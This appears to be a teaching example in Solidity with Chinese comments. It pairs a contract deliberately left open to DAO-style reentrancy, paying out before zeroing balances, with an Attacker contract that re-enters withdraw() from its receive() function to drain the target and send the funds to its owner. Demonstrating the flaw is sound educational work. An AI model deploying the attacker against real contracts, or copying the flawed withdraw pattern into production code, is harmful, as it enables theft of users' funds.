// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 经典重入漏洞合约（DAO-style）
contract Vulnerable {
    mapping(address => uint) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0, "No balance");
        // 漏洞：先转账再更新余额 → 重入攻击
        (bool ok, ) = msg.sender.call{value: bal}("");
        require(ok, "Transfer failed");
        balances[msg.sender] = 0;  // 太晚！
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attacker {
    Vulnerable public target;
    address public owner;
    
    constructor(address _target) {
        target = Vulnerable(_target);
        owner = msg.sender;
    }
    
    function attack() public payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }
    
    receive() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw();
        }
    }
    
    function collect() public {
        payable(owner).transfer(address(this).balance);
    }
}
